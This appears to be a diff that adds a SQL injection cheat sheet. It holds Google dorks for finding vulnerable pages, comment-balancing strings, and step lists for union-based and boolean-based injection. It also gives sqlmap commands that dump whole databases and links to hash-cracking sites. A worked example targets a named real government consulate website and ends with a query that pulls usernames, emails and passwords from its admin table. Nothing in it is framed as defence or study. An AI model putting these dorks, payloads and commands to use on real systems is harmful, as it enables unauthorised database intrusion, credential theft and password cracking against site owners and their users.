@@ -1,0 +1,143 @@
+Some Dorking:
+inurl:article.php?id= 
+inurl:article.php?id= 
+inurl:content.php?id= 
+inurl:detail.php?id= 
+inurl:gallery.php?id=
+inurl:index.php?id=
+inurl:index.php?id= 
+inurl:main.php?id= 
+inurl:news.php?id= 
+inurl:page.php?id= 
+inurl:pageid=
+inurl:index.php?id= site:.in
+inurl:main.php?id= site:.in
+
+inurl:article.php?id= site:"abc.xyz"
+inurl:article.php?id= site:"abc.xyz"
+inurl:content.php?id= site:"abc.xyz"
+inurl:detail.php?id=  site:"abc.xyz"
+inurl:gallery.php?id= site:"abc.xyz"
+inurl:index.php?id= site:"abc.xyz"
+inurl:index.php?id= site:"abc.xyz"
+inurl:main.php?id= site:"abc.xyz"
+inurl:news.php?id= site:"abc.xyz"
+inurl:page.php?id= site:"abc.xyz"
+inurl:pageid= site:"abc.xyz"
+
+Firefox Addon : https://addons.mozilla.org/en-US/firefox/addon/hackbar/
+
+URL Balancer:
+
+%00
+%23
+%23%23
+%60
+%90
+'))--+-
+')--+
+')--+-
+'--+
+'--+-
+))--
+)--
+)--+
+--
+-- -
+-- -/*
+--+
+--+-
+/*
+;%00
+#
+
+Method 01 : Union Based:
+1. Use '
+2. Fixed By -,--+-,--+,-- -
+3. Used order by 1 [union based > column Count > Order By]
+4. Used union all Select [union based > union stagment > union all select]
+5. Used database name One Shot [Union Based > database > database name one shot]
+6. Used TableName One Shot [Union Based > table > table Name One shot]
+7. Used COlumnBase One Shot [Union Based > Column > columnBased One Shot]
+8. Used data One Shot [Union Based > data > data One Shot]
+
+Method 02 : Union Based:
+1. Use ' and try Use URL Balancer
+2. Use +order+by+ and adding integer value for finding Column
+3. use +union+select and finding Vulnerable Column
+4. use @@version for finding version where your Column is Vulnerable
+5. use group_concat(table_name) and "+from+information_schema.tables+where+table_schema=database()"
+6. use group_concat(column_name) and "+from+information_schema.columns+where+table_name="
+7. use group_concat(username,0x3a,email,0x3a,password)
+
+Examples:
+1. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=53
+2. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=53+order+by+13-- 
+3. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13--
+4. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,@@version,6,7,8,9,10,11,12,13--
+5. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13+from+information_schema.tables+where+table_schema=database()--
+6. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,group_concat(column_name),6,7,8,9,10,11,12,13+from+information_schema.columns+where+table_name=CHAR(97, 100, 109, 105, 110)--
+7. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,group_concat(username,0x3a,email,0x3a,password),6,7,8,9,10,11,12,13+from+admin--
+
+Crack Site :
+http://aiisoo.com/
+https://crackstation.net/
+http://www.hashkiller.co.uk/
+
+Commands [ Get Method]
+sqlmap – url example.com --batch –dbs
+sqlmap –u exapmle.com –batch -D [database name] –tables
+sqlmap –u exapmle.com –batch -D [database name] –T [table name] –columns
+sqlmap –u exapmle.com –batch -D [database name] –T [table name] –C [ column name, column name] --dump
+
+Commands [ Post Method ]
+Sqlmap –r test.txt –p [parameter name] –batch --dbs
+Sqlmap –r test.txt –p [parameter name] –batch -D [database name] –tables
+Sqlmap –r test.txt –p [parameter name] –batch -D [database name] –T [table name] –columns
+Sqlmap –r test.txt –p [parameter name] –batch -D [database name] –T [table name] –C [columnname, column name] --dump
+Sqlmap –r test.txt –p [parameter name] –batch –dump –dbs
+
+
+
+Defronix:
+Union Based - Get Based:
+01. use \ and try to use balancer
+02. use +order+by+ for finding how many column
+03. use +union+all+select for finding vulnerable table number 
+04. for find database use database() and find user() where is vulnerable table number
+05. for find full database use "Union Base > Database > Database Name group contact"
+06. for find full tables use "Union base > table > Table Name group contact"
+07. For find full Columns use "Union base > columns > Column Name group Concat"
+08. For find full data use "Union base > data > data group contact"
+
+Post Based:
+01. Use \ and try to use -- or # or {-- } for balancing
+02. use ' order by 3# for finding how many column
+03. use ' union all select 1,2# for finding vulnerable table number 
+04. use ' union all select version(),2# for finding version
+05. use ' union all select version(),database()# for finding version and database
+06. for find full database use "Union Base > Database > Database Name group contact"
+07. for find full tables use "Union base > table > Table Name group contact"
+08. For find full data use "Union base > data > data group contact"
+
+Note : replace space with +
+
+Boolean Based:
+
+Suppose Database name is security
+' OR substring(database(), 1,1)="s"
+' OR substring(database(), 2,1)="e"
+' OR substring(database(), 3,1)="c"
+' OR substring(database(), 4,1)="u"
+' OR substring(database(), 5,1)="r"
+' OR substring(database(), 6,1)="i"
+' OR substring(database(), 7,1)="t"
+' OR substring(database(), 8,1)="y"
+
+payload:
+' OR 1=1 #
+" OR 1=1 #
+') OR 1=1 #
+") OR 1=1 #
+
+
